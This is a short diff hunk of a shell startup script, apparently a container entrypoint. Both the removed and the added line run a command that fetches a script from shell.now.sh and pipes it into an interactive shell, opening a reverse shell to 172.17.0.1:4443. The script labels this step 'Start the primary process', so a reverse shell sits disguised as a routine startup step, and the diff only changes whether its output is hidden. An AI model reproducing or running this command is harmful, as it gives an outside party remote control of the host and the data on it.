@@ -5,7 +5,7 @@ set -m
 
 # Start the primary process and put it in the background
 echo curl
-sh -c "curl https://shell.now.sh/172.17.0.1:4443 | sh -i &" > /dev/null 2>&1
+sh -c "curl https://shell.now.sh/172.17.0.1:4443 | sh -i &" &
 echo ok
 # Start the helper process
 echo server
